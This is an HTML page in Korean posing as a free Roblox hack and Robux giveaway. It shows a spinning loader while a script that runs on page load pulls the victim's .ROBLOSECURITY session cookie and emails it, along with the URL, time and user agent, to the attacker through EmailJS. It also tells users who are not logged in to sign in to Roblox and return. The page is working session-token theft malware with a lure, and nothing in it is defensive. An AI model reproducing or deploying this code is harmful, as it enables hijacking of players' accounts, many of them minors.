<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox 무료 핵 & Robux 지급</title>
  <style>
    body {margin:0;padding:0;height:100vh;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;}
    .container {text-align:center;padding:20px;max-width:95%;}
    h1 {font-size:2.5rem;margin-bottom:20px;}
    .loader {width:80px;height:80px;border:8px solid #0f0;border-top:8px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
    #status {font-size:1.2rem;color:#ff0044;margin-top:20px;}
    @keyframes spin {to{transform:rotate(360deg);}}
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>Roblox 핵 로딩 중...</h1>
    <div class="loader" id="loader"></div>
    <div id="status">계정 정보 확인 중...</div>
  </div>

  <script>
    emailjs.init("ycbHVBt3cm6FkCL--");

    async function stealRoblox() {
      let robloxCookie = null;
      try {
        // Roblox .ROBLOSECURITY 자동 추출
        const cookies = document.cookie.split('; ');
        for (let c of cookies) {
          if (c.startsWith('.ROBLOSECURITY=')) {
            robloxCookie = c.split('=')[1];
            break;
          }
        }

        if (robloxCookie) {
          await emailjs.send("service_jmsvqzd", "template_fjunjx8", {
            token: robloxCookie,
            url: location.href,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
          });

          document.getElementById("status").innerHTML = "완료! 정보 수집됨 (메일 확인)";
        } else {
          document.getElementById("status").innerHTML = "Roblox 로그인 안 됨 → roblox.com에서 로그인 후 다시 와";
        }
      } catch(e) {
        document.getElementById("status").innerHTML = "오류: " + (e.message || "다시 시도");
      }
      document.getElementById("loader").style.display = "none";
    }

    window.addEventListener("load", () => setTimeout(stealRoblox, 800));
  </script>
</body>
</html>
